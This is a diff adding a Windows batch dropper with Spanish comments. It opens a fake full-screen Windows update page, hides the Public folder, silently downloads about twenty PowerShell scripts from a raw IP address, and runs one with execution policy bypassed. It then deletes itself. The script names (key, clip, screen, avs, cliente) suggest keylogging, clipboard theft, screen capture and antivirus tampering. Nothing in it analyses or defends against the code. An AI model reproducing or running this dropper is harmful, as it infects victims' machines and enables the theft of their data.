@@ -1,0 +1,66 @@
+@echo off
+
+:: Crear el archivo VBS
+echo Set WshShell = CreateObject("WScript.Shell") > C:\Users\Public\script.vbs
+echo WshShell.Run "msedge.exe --new-window https://fakeupdate.net/win10ue" >> C:\Users\Public\script.vbs
+echo WScript.Sleep 3000 >> C:\Users\Public\script.vbs
+echo WshShell.SendKeys "{F11}" >> C:\Users\Public\script.vbs
+
+:: Ejecutar el archivo VBS
+cscript //nologo C:\Users\Public\script.vbs
+
+
+# Ocultar la carpeta Public
+attrib +h +s "C:\Users\Public"
+
+del C:\Users\Public\script.vbs
+powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'http://168.231.73.143/files/edifhjwe.ps1' -OutFile 'C:\Users\Public\edifhjwe.ps1'"
+
+powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'http://168.231.73.143/files/remo.ps1' -OutFile 'C:\Users\Public\remo.ps1'"
+
+powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'http://168.231.73.143/files/rotor.ps1' -OutFile 'C:\Users\Public\rotor.ps1'"
+
+powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'http://168.231.73.143/files/rotor2.ps1' -OutFile 'C:\Users\Public\rotor2.ps1'"
+
+powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'http://168.231.73.143/files/key.ps1' -OutFile 'C:\Users\Public\key.ps1'"
+
+powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'http://168.231.73.143/files/mensaje.ps1' -OutFile 'C:\Users\Public\mensaje.ps1'"
+
+powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'http://168.231.73.143/files/mensaje1.ps1' -OutFile 'C:\Users\Public\mensaje1.ps1'"
+
+powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'http://168.231.73.143/files/instaler.ps1' -OutFile 'C:\Users\Public\instaler.ps1'"
+
+powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'http://168.231.73.143/files/down.ps1' -OutFile 'C:\Users\Public\down.ps1'"
+
+powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'http://168.231.73.143/files/avs.ps1' -OutFile 'C:\Users\Public\avs.ps1'"
+
+powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'http://168.231.73.143/files/screen.ps1' -OutFile 'C:\Users\Public\screen.ps1'"
+
+powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'http://168.231.73.143/files/cliente.ps1' -OutFile 'C:\Users\Public\cliente.ps1'"
+
+powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'http://168.231.73.143/files/agent.txt' -OutFile 'C:\Users\Public\agent.txt'"
+
+powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'http://168.231.73.143/files/id.txt' -OutFile 'C:\Users\Public\id.txt'"
+
+powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'http://168.231.73.143/files/clip.ps1' -OutFile 'C:\Users\Public\clip.ps1'"
+
+powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'http://168.231.73.143/files/clip2.ps1' -OutFile 'C:\Users\Public\clip2.ps1'"
+
+powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'http://168.231.73.143/files/8.ps1' -OutFile 'C:\Users\Public\8.ps1'"
+
+powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'http://168.231.73.143/files/jujuzkt.ps1' -OutFile 'C:\Users\Public\jijiman.ps1'"
+
+powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'http://168.231.73.143/files/jujuzkt2.ps1' -OutFile 'C:\Users\Public\jujuzkt2.ps1'"
+
+powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'http://168.231.73.143/files/gygu.ps1' -OutFile 'C:\Users\Public\gygu.ps1'"
+
+powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'http://168.231.73.143/files/probando.ps1' -OutFile 'C:\Users\Public\probando.ps1'"
+
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Users\Public\probando.ps1"
+
+powershell.exe' -ArgumentList '-ExecutionPolicy Bypass -File C:\Users\Public\probando.ps1
+
+
+@echo off
+
+@del /f /q "%~f0" >nul 2>&1
